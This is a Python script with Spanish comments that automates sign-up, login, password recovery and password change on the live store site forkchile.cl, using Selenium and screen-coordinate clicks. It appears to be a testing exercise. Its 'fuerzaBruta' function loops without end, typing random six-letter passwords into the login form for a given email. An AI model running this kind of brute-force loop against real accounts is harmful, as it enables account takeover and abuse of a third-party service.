import selenium
import time
import pyautogui
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
#Recordar que la variable en este caso se llamará "driver", 
#con la que deberán trabajar los códigos.
#Existen ocasiones en las cuales la página necesita tiempo para cargar y 
#si se realizan acciones demasiado rápido, se descoordina el programa y termina. 
# Es recomendable en este caso usar #time.sleep(1) o los segundos que usted desee que espere.
def spawn_browser():    
    chrome_options = webdriver.ChromeOptions()    
    chrome_options.add_argument("--start-maximized")    
    chrome_options.add_experimental_option("detach",True)    
    driver = webdriver.Chrome(options=chrome_options)    
    driver.get("https://www.forkchile.cl/")    
    driver.set_window_position(1, 1)    
    driver.set_window_size(1300, 700)    
    return driver
spawn_browser()
def signIn(nombre,apellido,password,email,telefono,rut):
    email,terminacion=email.split("@")
    coor=[(1150,150),(715,360),(504,464),(480,505),(480,555),(480,603),(595,652),(587,462),(508,509),(630,564),(581,465),(631,540)]
    #iniciarSesion,Registrate,Nombre,Apellido,Email,Telefono,Continuar,pass,passx2,continuar,rut,finalizar.
    pyautogui.moveTo(coor[0][0],coor[0][1],1)#iniciarSesion  moveTo(x,y,tiempo)
    pyautogui.click()
    pyautogui.moveTo(coor[1][0],coor[1][1],1)#Registrate
    pyautogui.click()
    pyautogui.moveTo(coor[2][0],coor[2][1],1)#Nombre
    pyautogui.click()
    pyautogui.write(nombre)
    pyautogui.moveTo(coor[3][0],coor[3][1],1)#Apellido
    pyautogui.click()
    pyautogui.write(apellido)
    pyautogui.moveTo(coor[4][0],coor[4][1],1)#email
    pyautogui.click()
    pyautogui.write(email)
    pyautogui.hotkey("altright","q")
    pyautogui.write(terminacion)
    pyautogui.moveTo(coor[5][0],coor[5][1],1)#Telefono +56
    pyautogui.click()
    pyautogui.write(telefono)
    pyautogui.moveTo(coor[6][0],coor[6][1],1)#continuar
    pyautogui.click()
    pyautogui.moveTo(coor[7][0],coor[7][1],1)#pass
    pyautogui.click()
    pyautogui.write(password)
    pyautogui.moveTo(coor[8][0],coor[8][1],1)#passx2
    pyautogui.click()
    pyautogui.write(password)
    pyautogui.moveTo(coor[9][0],coor[9][1],1)#continuar
    pyautogui.click()
    pyautogui.moveTo(coor[10][0],coor[10][1],1)#rut
    pyautogui.click()
    pyautogui.write(rut)
    pyautogui.moveTo(coor[11][0],coor[11][1],3)#finalizar
    pyautogui.click()


def logIn(email,password):
    email,terminacion=email.split("@")
    coor=[(1150,150),(492,426),(520,474),(614,517)]
    #iniciarsesion,email,contraseña,botonIniciarSesion
    pyautogui.moveTo(coor[0][0],coor[0][1],1)#iniciarSesion
    pyautogui.click()
    pyautogui.moveTo(coor[1][0],coor[1][1],1)#email
    pyautogui.click()
    pyautogui.write(email)
    pyautogui.hotkey("altright","q") #@
    pyautogui.write(terminacion)
    pyautogui.moveTo(coor[2][0],coor[2][1],1)#pass
    pyautogui.click()
    pyautogui.write(password)
    pyautogui.press("enter")

def passRecovery(email):
    email,terminacion=email.split("@")
    coor=[(1150,150),(644,561),(484,352)]
    #iniciarSesión,RecuperarContraseña,IngresarMail
    pyautogui.moveTo(coor[0][0],coor[0][1],1)#iniciarSesion
    pyautogui.click()
    pyautogui.moveTo(coor[1][0],coor[1][1],1)#recuperarContraseña
    pyautogui.click()
    pyautogui.moveTo(coor[2][0],coor[2][1],1)#IngresarMail
    pyautogui.click()
    pyautogui.write(email)
    pyautogui.hotkey("altright","q") #@
    pyautogui.write(terminacion)
    pyautogui.press("enter")

def changePass(email,password,passNueva,logIn):
    logIn(email,password)
    #login()
    coor=[(1112,150),(1112,195),(600,470),(567,240),(520,290),(507,340),(602,326)]
    #posicion,MiPerfil,EditarPass,passActual,passNueva,passNuevaRepeat,Click
    pyautogui.moveTo(coor[0][0],coor[0][1],4)#posicion
    pyautogui.click()
    pyautogui.moveTo(coor[1][0],coor[1][1],1)
    pyautogui.click()#miperfil
    pyautogui.moveTo(coor[2][0],coor[2][1],1)
    pyautogui.click()#editarpass
    pyautogui.moveTo(coor[3][0],coor[3][1],1)
    pyautogui.click()#passactual
    pyautogui.write(password)
    pyautogui.moveTo(coor[4][0],coor[4][1],1)
    pyautogui.click()#passNueva
    pyautogui.write(passNueva)
    pyautogui.moveTo(coor[5][0],coor[5][1],1)
    pyautogui.click()#passNuevax2
    pyautogui.write(passNueva)
    pyautogui.press("enter")
    #pyautogui.moveTo(coor[6][0],coor[6][1],1)
    #pyautogui.click()#click


def generador():
    letras=string.ascii_lowercase
    resultado="".join(random.choice(letras) for i in range(6))
    return resultado

def fuerzaBruta(email,logIn):
    password=generador()
    logIn(email,password)
    time.sleep(3)
    pyautogui.click()
    pyautogui.click()
    pyautogui.hotkey("delete")
    i=1
    print("intento "+str(i)+" con la pass "+password) 
    while True:
        i+=1
        password=generador()
        pyautogui.write(password)
        pyautogui.press("enter")
        print("intento "+str(i)+" con la pass "+password)
        time.sleep(2)
        pyautogui.click()
        pyautogui.click()
        pyautogui.hotkey("delete")
#signIn(Nombre,Apellido,contraseña,mail,telefono,rut)
#logIn(mail,password)
#passRecovery(mail)
#changePass(mail,passwordactual,nueva,logIn)
#fuerzaBruta(mail,logIn)
